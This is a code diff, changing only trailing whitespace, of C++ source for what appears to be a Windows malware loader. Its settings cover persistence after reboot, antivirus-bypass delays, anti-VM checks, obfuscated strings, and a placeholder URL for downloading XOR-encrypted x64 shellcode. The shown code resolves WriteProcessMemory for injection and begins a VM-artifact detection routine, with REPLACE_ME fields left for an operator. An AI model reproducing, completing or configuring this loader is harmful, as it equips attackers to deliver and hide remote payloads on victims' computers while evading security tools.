@@ -7,7 +7,7 @@
 #include <string>
 #include <Shlwapi.h>
 #include "obfusheader.h"
-#include <cstring> 
+#include <cstring>
 #include <algorithm>
 #include <psapi.h>
 #pragma comment(lib, "Wininet.lib")
@@ -17,13 +17,13 @@
 #define ENABLE_STARTUP 0 // Persist on the machine after reboot
 #define SLEEP_DELAY 0   // Might help in bypassing some AVs
 #define ENABLE_ANTIVM 0  // Set to 1 to enable anti-VM checks, 0 to disable
-#define STARTUP_ENTRYNAME OBF("PERSISTENCE_REPLACE_ME") // Randomize these 
-#define DIRECTORY_NAME OBF("DIRECTORY_REPLACE_ME") // Randomize these 
-#define FILENAME OBF("FILENAME_REPLACE_ME") // Randomize these 
+#define STARTUP_ENTRYNAME OBF("PERSISTENCE_REPLACE_ME") // Randomize these
+#define DIRECTORY_NAME OBF("DIRECTORY_REPLACE_ME") // Randomize these
+#define FILENAME OBF("FILENAME_REPLACE_ME") // Randomize these
 #define HIDE_DIRECTORY 0 // Optional
 #define XOR_DECRYPTION_KEY OBF("XOR_KEY_REPLACE_ME") // The decryption key for your shellcode
 #define SHELLCODE_URL OBF(L"SHELLCODE_URL_REPLACE_ME") // Replace SHELLCODE_URL_REPLACE_ME with your shellcode link , NOTE x64 shellcode only.
-#define SINGLE_INSTANCE 1 // MUTEX 
+#define SINGLE_INSTANCE 1 // MUTEX
 
 typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
 WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("WriteProcessMemory"));
@@ -100,11 +100,11 @@ BOOL VMArtifactsDetect() {
     };
     DWORD bufferSize = GetEnvironmentVariableW(OBF(L"SystemRoot"), NULL, 0);
     if (bufferSize == 0) {
-        return FALSE; 
+        return FALSE;
     }
     std::wstring systemRoot(bufferSize, L'\0');
     if (GetEnvironmentVariableW(OBF(L"SystemRoot"), &systemRoot[0], bufferSize) == 0) {
-        return FALSE; 
+        return FALSE;
     }
     systemRoot.resize(bufferSize - 1);
     std::wstring system32Folder = systemRoot + OBF(L"\\System32\\*");
